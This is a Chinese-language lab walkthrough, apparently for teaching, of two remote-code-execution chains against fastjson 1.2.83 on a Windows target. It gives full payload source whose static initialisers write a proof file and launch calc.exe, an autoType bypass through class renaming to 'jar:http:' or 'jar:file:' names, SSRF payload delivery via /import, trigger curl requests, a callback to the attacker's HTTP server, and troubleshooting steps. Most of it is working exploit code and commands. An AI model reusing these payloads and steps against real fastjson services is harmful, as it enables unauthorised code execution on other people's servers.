# 一条 JSON 打穿 / SSRF 到 RCE

同一套靶场、同一台虚机，两条链路，从短到长。

|         | 链一：`jar:http:`                  | 链二：SSRF + `jar:file:`     |
| ------- | ------------------------------- | ------------------------- |
| 请求数     | **1 条 JSON**                    | 2 个请求（`/import` 拉取 + 触发）  |
| 触发方式    | **GET `/trace?step=parse`**（首选） | `/import`（GET）→ 同样 GET 触发 |
| 靶机磁盘    | 不落 jar                          | `C:\fj\uploads\imp` 多一个文件 |
| 载荷类     | **必须 `extends Exception`**      | 任意类都行                     |
| 类名里带 IP | 带（IP 变了要重打包）                    | 不带（IP 变了只需重跑 `/import`）   |
| 适合讲     | "不碰目标也能打穿"                      | "只有一个 URL 导入功能时怎么打"       |

> 为什么首选 GET：本机（2026-11-13 实测）POST 到 18086 被安全软件 RST（`curl: (56)`），GET 不受影响。`/trace?step=parse` 内部就是 `JSON.parse("{\"@type\":\"...\"}")`，同一个漏洞入口。安全软件关掉后 POST `/parse` 也能用，两者效果一致。详见第 17 节。

靶场：`C:\fj\app2.jar`，端口 18086，JDK `1.8.0_66`，fastjson 1.2.83，默认配置。

## 0. 两台机器，谁干什么

| 角色      | 机器                  | 地址                    | 做什么                               |
| ------- | ------------------- | --------------------- | --------------------------------- |
| **攻击者** | 虚机 `fastjson-linux` | `192.168.244.131`     | 写载荷、编译打包、起 HTTP 服务、**发全部请求**      |
| **靶机**  | Windows             | `192.168.244.1:18086` | 只跑 `app2.jar`；被利用后弹计算器、写 proof 文件 |

判断命令该在哪台机器上执行：

- 出现 `~/ssrf`、`javac`、`python3`、`hostname -I` → **虚机**
- 出现 `C:\`、`dir`、`type`、`java -jar app2.jar` → **Windows**

Windows 只做两件事：**起靶场**、**看结果**。`/import` 和 `/parse` 全部从虚机发出——这才叫攻击。

---

## 1. 靶机启动（Windows）

Windows 上开一个窗口，保持不关：

```bat
cd /d C:\fj
java -jar app2.jar --server.port=18086
```

另开一个窗口验证：

```bat
curl.exe -s http://127.0.0.1:18086/status
```

```json
{"fastjsonVersion":"1.2.83","autoTypeSupport":false,"javaVersion":"1.8.0_66","vulnerable":true}
```

---

## 2. 查虚机 IP（在虚机上）

两条链路都要用到虚机地址。**同一条 IP 必须准备两种写法**，用途不同：

```bash
IP=$(hostname -I | awk '{print $1}')
IFS=. read a b c d <<< "$IP"
DEC=$((a*16777216 + b*65536 + c*256 + d))
echo "IP=$IP    DEC=$DEC"
```

```text
IP=192.168.244.131    DEC=3232298115
```

| 写法      | 例子                | 用在哪                                        |
| ------- | ----------------- | ------------------------------------------ |
| 点分      | `192.168.244.131` | `curl http://$IP:19090/...`、`/import?url=` |
| **十进制** | `3232298115`      | **`@type` 和 `patch_name.py` 的名字里，只能用它**    |

**为什么类名里必须十进制**：fastjson 的 `checkAutoType` 会对整个 `@type` 做 `replace('.', '/')`，点分 IP 会被拆成 `192/168/244/131`，URL 直接废掉。而报错只会显示 `autoType is not support.`，看不出是地址被改坏了。

**没有虚机时怎么换算**：任意 IP 都能算

```bash
IP=192.168.244.131
IFS=. read a b c d <<< "$IP"; echo $((a*16777216 + b*65536 + c*256 + d))
# 3232298115
```

```text
127.0.0.1        → 2130706433
192.168.244.131  → 3232298115
```

其它确认方式：虚机上 `ip addr show` 或 `ifconfig`；Windows 侧 `ping 192.168.244.131` 能通再往下走。IP 是 DHCP 分的，**每换一次网络都可能变**，演示前重新查一遍。

自检虚机到靶机通不通：

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.244.1:18086/status
# 200
```

---

# 链一：一条 JSON（不落盘）

## 3. 写载荷 `EvilEx.java`

**关键：`extends Exception`。** 这不是随便加的，它决定 fastjson 用 `ThrowableDeserializer`（反射实例化），而不是 ASM 反序列化器（会按斜杠类名再解析一次，网络流已关 → 失败）。

```bash
mkdir -p ~/ssrf/com/alibaba/fastjson/annotation
cd ~/ssrf

cat > EvilEx.java <<'JAVA'
import com.alibaba.fastjson.annotation.JSONType;

@JSONType
public class EvilEx extends Exception{

    public EvilEx() { super("poc"); }
    public EvilEx(String m) { super(m); }

    static {
        StringBuilder sb = new StringBuilder();
        sb.append("CVE-2026-16723 single-stage (jar:http dot-form)\n");
        sb.append("user   : ").append(System.getProperty("user.name")).append("\n");
        sb.append("java   : ").append(System.getProperty("java.version")).append("\n");
        sb.append("loader : ").append(Thread.currentThread().getContextClassLoader()).append("\n");
        try {
            java.nio.file.Files.write(
                java.nio.file.Paths.get("C:/fj/rce-proof-http.txt"),
                sb.toString().getBytes("UTF-8"));
        } catch (Throwable ignored) {
        }
        try {
            new ProcessBuilder("calc.exe").start();
        } catch (Throwable ignored) {
        }
    }
}
JAVA
```

 `loader` 那一行用 `Thread.currentThread().getContextClassLoader()`，**不要写 `EvilEx.class.getClassLoader()`** —— 远程加载时 `ldc` 解析自己的类名会失败，`static` 跑到一半抛 `NoClassDefFoundError`，看起来像"没执行"。

桩注解（只在第一次需要，`com/` 目录结构不能错）：

```bash
cat > com/alibaba/fastjson/annotation/JSONType.java <<'JAVA'
package com.alibaba.fastjson.annotation;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.TYPE)
public @interface JSONType {
}
JAVA
```

`@Retention(RUNTIME)` 不能省 —— fastjson 靠 ASM 读这个注解判断"类自证可信"，没有它就停在 `autoType is not support.`。

改名脚本（虚机上已经有就跳过）：

```bash
cp ~/handson/patch_name.py . 2>/dev/null || curl -sO http://192.168.244.1:19091/patch_name.py
ls -l EvilEx.java com/alibaba/fastjson/annotation/JSONType.java patch_name.py
```

## 4. 编译

```bash
cd ~/ssrf
mkdir -p classes
javac --release 8 -nowarn -d classes EvilEx.java com/alibaba/fastjson/annotation/JSONType.java
cp classes/EvilEx.class clean2.class
wc -c classes/EvilEx.class
```

`--release 8` 不能省，靶机是 8u66，class 版本必须是 52。漏了会报 `UnsupportedClassVersionError`。

## 5. 改名（这步最容易错）

```bash
cd ~/ssrf
IP=$(hostname -I | awk '{print $1}')
IFS=. read a b c d <<< "$IP"
DEC=$((a*16777216 + b*65536 + c*256 + d))
echo "IP=$IP  DEC=$DEC"          # 先看一眼，DEC 不能是空

NAME='jar:http://'"$DEC"':19090/impe!/EvilEx'
python3 patch_name.py clean2.class "$NAME" classes/EvilEx.class
javap -v -p classes/EvilEx.class | grep this_class
```

```text
类名: EvilEx -> jar:http://3232298115:19090/impe!/EvilEx (1757 bytes)
  this_class: #NN    // "jar:http://3232298115:19090/impe!/EvilEx"
```

**规则只有一条**：`this_class` = `@type` 里所有 `.` 换成 `/`。对照关系：

```text
@type          jar:http:..3232298115:19090.impe!.EvilEx
this_class     jar:http://3232298115:19090/impe!/EvilEx
```

两边的 IP 都必须是**十进制**，谁都不用点分。写成点分会得到 `wrong name` 或 `IllegalName`。

 `patch_name.py` 要三个参数。少传一个它只打印帮助、不改文件，也不报错。  
 名字里带 `!`，所以用 `'...'"$DEC"'...'` 拼接：`!` 在单引号里才不会被 shell 的历史展开吞掉。

## 6. 打包

```bash
cd ~/ssrf
python3 -c "
import zipfile, os
z = zipfile.ZipFile('impe', 'w', zipfile.ZIP_DEFLATED)
z.write('classes/EvilEx.class', 'EvilEx.class')
z.close()
print(os.path.getsize('impe'), zipfile.ZipFile('impe').namelist())"
```

```text
1105 ['EvilEx.class']
```

（字节数差几个正常；条目名必须是 `EvilEx.class`，`@type` 里最后一段是 `EvilEx`，fastjson 查资源时会自动补 `.class`）

## 7. 起 HTTP 服务

```bash
cd ~/ssrf
python3 -m http.server 19090 --bind 0.0.0.0
```

**必须在这个目录起**，否则 `/impe` 404。窗口不关。

另开终端自检：

```bash
IP=$(hostname -I | awk '{print $1}')
curl -s -o /dev/null -w "%{http_code}\n" "http://$IP:19090/impe"
# 200
```

## 8. 触发（GET，一条命令）

**在虚机上发**（攻击者机器，不是靶机）。**首选 GET**——2026-11-13 实测：这台 Windows 上 POST 会被安全软件 RST（`curl: (56) Recv failure: 连接被对方重置`），GET 完全正常。`/trace?step=parse` 内部执行的就是 `JSON.parse("{\"@type\":\"...\"}")`，与 `/parse` 是同一个漏洞入口，只是走 GET：

```bash
curl -s 'http://192.168.244.1:18086/trace?type=jar:http:..3232298115:19090.impe!.EvilEx&step=parse'; echo
```



```json
{"type":"jar:http:..3232298115:19090.impe!.EvilEx","jsonParse":"...","instance":"...@xxxx"}
```

`@type` 里面的 `3232298115` 是**虚机自己的** IP（十进制），因为它要指向虚机的 HTTP 服务。

同时：桌面弹计算器，虚机 `http.server` 窗口打出**一次**来源为 `192.168.244.1` 的 `GET /impe`。

 **POST 写法**（安全软件关掉网络防护后可用）：
 ```bash
curl -s -X POST http://192.168.244.1:18086/parse -H 'Content-Type: application/json' --data-binary @body.json; echo
 ```

 返回 `{"ok":true,...}`，结果相同。报 `(56) Recv failure` 就是被重置，换回 GET。  
 `body.json` 的内容：`{"@type":"jar:http:..3232298115:19090.impe!.EvilEx"}`（一行，用 heredoc 写入，`!` 不会被 shell 吃掉）。

**命令被拆断时的典型症状**：终端报 `-H : 无法将…` 或 `event not found`，或者干脆什么都不打印（`-s` 把错误吞了）。看到这个不是载荷问题——排查四连见第 17 节"POST 被重置"一段。

## 9. 验收

攻击者这一侧能看到的证据就两条，**都不用碰靶机**：

1. 虚机 `http.server` 窗口多出**一次** `GET /impe`（这次是靶机来取载荷）；
2. 靶机的 HTTP 响应里 `ok:true` 且 `class` 是那串类名。

至于"代码真的执行了"，看靶机那一侧（演示时就在你面前的 Windows 窗口）：

```bat
type C:\fj\rce-proof-http.txt
```

```text
CVE-2026-16723 single-stage (jar:http dot-form)
user   : MECHREVO
java   : 1.8.0_66
loader : org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c
```

计算器也是在同一块屏幕上弹出的——**它是靶机的桌面，不是虚机的**，这一点讲的时候要点明。

 想让"执行成功"这件事在**虚机**上也能看到（不靠回头看靶机屏幕），在 `static{}` 里加一行回调，然后看 `http.server` 的日志：

 ```java
try { 
new java.net.URL("http://192.168.244.131:19090/hit").openStream().close(); } 
catch (Throwable ignored) {}
 ```

 日志里出现 `GET /hit 404` 就说明代码跑了（404 无所谓，要紧的是这条请求是靶机发的）。IP 记得换成虚机的**点分**写法，这是真实 URL，不用十进制。

**再确认"不落盘"**：`dir C:\fj\uploads` 里没有新增文件（`imp`、`imp2` 那几条是链二留下的，不是这次）。

---

# 链二：SSRF + `jar:file:`（落盘）

链二多一步，但**不挑载荷形态**，而且类名里不带 IP。讲"目标只有一个 URL 导入功能"时用这条。

## 10. 写载荷 `Evil.java`

和 `EvilEx` 的区别只有类声明：**不继承任何类**。

```bash
cd ~/ssrf
cat > Evil.java <<'JAVA'
import com.alibaba.fastjson.annotation.JSONType;

@JSONType
public class Evil {

    static {
        StringBuilder sb = new StringBuilder();
        sb.append("CVE-2026-16723 SSRF-stage - code executed in target JVM\n");
        sb.append("user   : ").append(System.getProperty("user.name")).append("\n");
        sb.append("java   : ").append(System.getProperty("java.version")).append("\n");
        sb.append("loader : ").append(Thread.currentThread().getContextClassLoader()).append("\n");
        try {
            java.nio.file.Files.write(
                java.nio.file.Paths.get("C:/fj/rce-proof-http.txt"),
                sb.toString().getBytes("UTF-8"));
        } catch (Throwable ignored) {
        }
        try {
            new ProcessBuilder("calc.exe").start();
        } catch (Throwable ignored) {
        }
    }
}
JAVA
```

 这个类**不能**用于链一。普通 JavaBean 会走 `FastjsonASMDeserializer`，实例化时按斜杠名再解析一次，网络流已关 → `NoClassDefFoundError`。它只适合落盘后加载。

## 11. 编译

```bash
cd ~/ssrf
javac --release 8 -nowarn -d classes Evil.java com/alibaba/fastjson/annotation/JSONType.java
cp classes/Evil.class clean.class
wc -c classes/Evil.class
```

```text
1639 classes/Evil.class
```

## 12. 改名（这里用 `jar:file:`，不带 IP）

```bash
cd ~/ssrf
python3 patch_name.py clean.class 'jar:file:/C:/fj/uploads/imp!/Evil' classes/Evil.class
javap -v -p classes/Evil.class | grep this_class
```

```text
类名: Evil -> jar:file:/C:/fj/uploads/imp!/Evil (1668 bytes)
  this_class: #NN    // "jar:file:/C:/fj/uploads/imp!/Evil"
```

三样要对上：`类名: Evil -> ...`、字节数变成 **1668**、`this_class` 是那串路径。


名字里的 `imp` 就是第 14 步 `name=imp` 的落点文件名，两边必须一致。这条不带 IP，所以虚机 IP 变了也不用重打包。

## 13. 打包

```bash
cd ~/ssrf
python3 -c "
import zipfile, os
z = zipfile.ZipFile('payloadf', 'w', zipfile.ZIP_DEFLATED)
z.write('classes/Evil.class', 'Evil.class')
z.close()
print(os.path.getsize('payloadf'), zipfile.ZipFile('payloadf').namelist())"
```

```text
1060 ['Evil.class']
```

复验 jar 里的类名：

```bash
mkdir -p /tmp/ck && cd /tmp/ck && rm -f Evil.class
unzip -oq ~/ssrf/payloadf Evil.class
javap -v -p Evil.class | grep this_class
cd ~/ssrf
```

必须是 `jar:file:/C:/fj/uploads/imp!/Evil`。

## 14. 让靶机自己拉（SSRF 就在这里）

HTTP 服务还是第 7 步那个 `19090`，同一个目录，`payloadf` 和 `impe` 可以共存。

```bash
cd ~/ssrf
IP=$(hostname -I | awk '{print $1}')
curl -s "http://192.168.244.1:18086/import?url=http://$IP:19090/payloadf&name=imp"
echo
```

```json
{"fetched":"http://192.168.244.131:19090/payloadf",
 "saved":"C:\\fj\\uploads\\imp","bytes":1060,
 "typeName":"jar:file:.C:.fj.uploads.imp!.Evil"}
```

虚机 `http.server` 窗口打出：

```text
192.168.244.1 - - "GET /payloadf HTTP/1.1" 200 -
```

这就是 SSRF 的证据：**请求是靶机发起的**，我们一个字节都没给它。

靶机上确认已落盘、还没执行（这一步只是给人看，攻击者拿不到靶机文件）：

```bat
dir C:\fj\uploads\imp
```

## 15. 触发执行

**同样在虚机上发，同样首选 GET**（POST 被安全软件 RST 时用这条，见第 17 节）：

```bash
curl -s 'http://192.168.244.1:18086/trace?type=jar:file:.C:.fj.uploads.imp!.Evil&step=parse'; echo
```

```json
{"type":"jar:file:.C:.fj.uploads.imp!.Evil","jsonParse":"...","instance":"...@xxxx"}
```

安全软件关掉后也可以用 POST：

```bash
curl -s -X POST http://192.168.244.1:18086/parse \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:file:.C:.fj.uploads.imp!.Evil"}'
echo
```

计算器弹出，proof 文件内容变成 `SSRF-stage` 那一版（两版都会覆盖同一个文件，看第一行区分）。

---

## 16. 再演示一次

**一个类名，在一个 JVM 里只会执行一次。** 两条链都一样。

| 链                | 第 1 次（新名字）           | 第 2 次（同名字）              |
| ---------------- | -------------------- | ----------------------- |
| 链一 `jar:http:..` | `ok:true` + proof 生成 | `ok:true`，**proof 不生成** |
| 链二 `jar:file:..` | `ok:true` + proof 生成 | `ok:true`，**proof 不生成** |

实测（同一个 18086 JVM，每次先删 proof 再看时间戳）：

```text
jar:http:..2130706433:19092.impe10!.EvilEx
  第 1 次 → 09:25:49 proof 生成
  第 2 次 → ok:true，无 proof

jar:file:.C:.fj.uploads.imp10!.Evil
  第 1 次 → 09:25:21 proof 生成
  第 2 次 → ok:true，无 proof
```

原因是 `TypeUtils.loadClass` 按类名做了缓存：第二次拿到的是已初始化的 `Class` 对象，反序列化照样能 `new` 出实例（所以 `ok:true`、`result` 里有 hashCode），但 `<clinit>` 不会重跑。

**所以：**

| 做法           | 说明                                                                      |
| ------------ | ----------------------------------------------------------------------- |
| **重启靶场**（推荐） | `Ctrl+C` 停掉 `app2.jar` 再起，类名全部可复用，磁盘文件不用动                               |
| 换名字          | 链一改 `NAME=` 与 `@type` 两处；链二改 `patch_name.py`、`/import?name=`、`@type` 三处 |

链一换名字示例：

```bash
NAME='jar:http://'"$DEC"':19090/impe11!/EvilEx'
python3 patch_name.py clean2.class "$NAME" classes/EvilEx.class
python3 -c "
import zipfile
z=zipfile.ZipFile('impe11','w',zipfile.ZIP_DEFLATED); z.write('classes/EvilEx.class','EvilEx.class'); z.close()"
# @type 改成 jar:http:..<DEC>:19090.impe11!.EvilEx
```

 判断“是不是缓存问题”：看 proof 文件的修改时间。`ok:true` 但 proof 时间没变 = 缓存命中，不是漏洞失效。

链二换名字（三处同步改）：

```bash
NAME='jar:file:/C:/fj/uploads/imp11!/Evil'          # 注意是 jar:file，不是 jar:http
python3 patch_name.py clean.class "$NAME" classes/Evil.class
python3 -c "
import zipfile
z=zipfile.ZipFile('payloadf','w',zipfile.ZIP_DEFLATED); z.write('classes/Evil.class','Evil.class'); z.close()"
# /import?url=http://<IP>:19090/payloadf&name=imp11
# @type 改成 jar:file:.C:.fj.uploads.imp11!.Evil
```

或者最简单：`Ctrl+C` 停掉 `app2.jar` 再起，类名全部可复用。

---

## 17. 排查

| 现象                                                     | 原因                                              | 处理                                                  |
| ------------------------------------------------------ | ----------------------------------------------- | --------------------------------------------------- |
| 虚机 `curl` **没有任何输出**、直接回提示符                            | 请求没到靶机：Windows 防火墙拦了入站 18086（Wi-Fi 被标成"公用"时最常见） | 见下方"防火墙"一段                                          |
| `bash: !!:socket.inet_aton: event not found`           | python 一行里的 `'!I'` 被历史展开，`DEC` 为空               | 用第 2 节纯 bash 算法，或 `set +H`                          |
| `错误: 找不到文件: Evil.java`                                 | 不在 `~/ssrf`                                     | `cd ~/ssrf` 再执行                                     |
| `patch_name.py` 只打印帮助、没改文件                             | 少传参数                                            | 三个参数：`clean.class 新名 输出.class`                      |
| `/parse` 报 `wrong name: Evil`                          | `this_class` 与 `@type` 点转斜杠后不一致                 | 两边都用**十进制 IP**，见第 5 节                               |
| `/parse` 报 `IllegalName`                               | 名字里有 `/` 或用了点分 IP                               | 全点号 + 十进制                                           |
| `autoType is not support.`                             | `@type` 与 `this_class` 对不上，或桩注解缺 `RUNTIME`      | 重新编译桩注解                                             |
| `autoType is not support. `（末尾空格）                      | `@type` 是空串，`!` 被吃了                             | 用单引号 / 拼接                                           |
| 链一报 `NoClassDefFoundError ... FastjsonASMDeserializer` | 类没 `extends Exception`                          | 用 `EvilEx`，别用 `Evil`                                |
| 命令粘进去后报一堆语法错、或 `-H`/`-d` 变成单独一条命令                      | 多行块被终端拆成多条，`curl` 没组装完                          | 用 `--data-binary @body.json`（第 8 节），或 `set +H` 后发单行 |
| `ok:true` 但没弹窗 / proof 时间戳没变                           | 该类名在这个 JVM 里已经执行过，`TypeUtils` 缓存命中              | 换新名字，或重启靶场（第 16 节）                                  |
| 有 proof 但没弹窗                                           | 靶机无桌面会话 / 计算器被窗口挡住                              | 以 proof 文件为准，执行已发生                                  |
| 没弹窗但有 proof 文件                                         | 靶机无桌面会话                                         | 以 proof 文件为准，已证明执行                                  |
| `/import` 404                                          | 跑的是旧 `app2.jar`                                 | 用带 `/import` 的包重启                                   |
| `/import` 连接被拒                                         | 虚机服务没起 / IP 变了                                  | 第 2 节重查 IP，第 7 节重起服务                                |
| `/import` 返回 `stream=false`                            | 虚机 HTTP 服务起错目录                                  | 必须在 `~/ssrf` 起                                      |
| `UnsupportedClassVersionError`                         | 漏了 `--release 8`                                | 重编译                                                 |

### 防火墙（虚机打不通靶机时）

先分清方向，两步各测一次：

```bash
# ① 虚机 → 靶机（攻击方向），必须 200
curl -s -m 5 -o /dev/null -w "code=%{http_code}\n" http://192.168.244.1:18086/status
```

```bat
:: ② 靶机 → 虚机（回连方向，链一要它去取 jar），必须 200
curl.exe -s -m 5 -o /dev/null -w "code=%{http_code}\n" http://192.168.244.131:19090/impe
```

`code=000` 就是被拦。Windows 上以**管理员** PowerShell 放行一次：

```powershell
New-NetFirewallRule -DisplayName "lab-18086" -Direction Inbound -Protocol TCP -LocalPort 18086 -Action Allow -Profile Any
```

 症状特征：虚机上 `curl` **一点输出都没有**就回到提示符。`/parse` 内部 `catch (Throwable)` 后一定返回 JSON，空响应只能是请求没到。

### POST 被重置时改用 GET 触发（2026-11-13 实测）

症状：`curl -v` 显示 `curl: (56) Recv failure: 连接被对方重置`，但同一端口 GET 是 200，代理也是 none。这是 Windows 上安全软件（360/火绒/Defender 网络防护）拦 POST 的典型表现，**与载荷无关**。

排查四连（一次定位，别靠猜）：

```bash
env | grep -i proxy || echo none
timeout 3 bash -c 'echo > /dev/tcp/192.168.244.1/18086' && echo "TCP OK" || echo "TCP FAIL"
curl -s -o /dev/null -w "GET=%{http_code}\n" http://192.168.244.1:18086/status
curl -sS -X POST http://192.168.244.1:18086/parse -H 'Content-Type: application/json' --data-binary @body.json; echo "exit=$?"
```

`exit=56` 就是 POST 被重置。处理：关掉安全软件的网络防护，或直接改用 GET 触发——`/trace?step=parse` 内部执行的就是 `JSON.parse("{\"@type\":\"...\"}")`，同一个漏洞入口：

```bash
curl -s 'http://192.168.244.1:18086/trace?type=jar:http:..3232298115:19090.impe!.EvilEx&step=parse'; echo
```

链二的 `/import` 本来就是 GET，不受影响；链二触发同样换成 `/trace` 的 GET 写法。

---

## 18. 讲解要点

```text
分工：虚机 192.168.244.131 是攻击者，所有请求都从这里发
      Windows 192.168.244.1:18086 是靶机，只跑 app2.jar

链一：@type = jar:http:..<DEC>:19090.impe!.EvilEx
      靶机自己下载 → defineClass → <clinit> → 计算器
      JDK 8 直接加载远程类；条件是载荷继承 Throwable，实例化走反射

链二：/import 让靶机去取（SSRF 只搬字节）
      落盘 C:\fj\uploads\imp 只是个普通文件
      @type = jar:file:.C:.fj.uploads.imp!.Evil → defineClass → <clinit> → 计算器

共同点：执行那一段永远是 fastjson 的 autoType + defineClass，
        投递方式可以换（URL 导入、附件上传、内网写文件）
```

一句话差异：**链一省掉了落盘，但要求载荷是 `Throwable`；链二多一个请求，什么类都能用。**
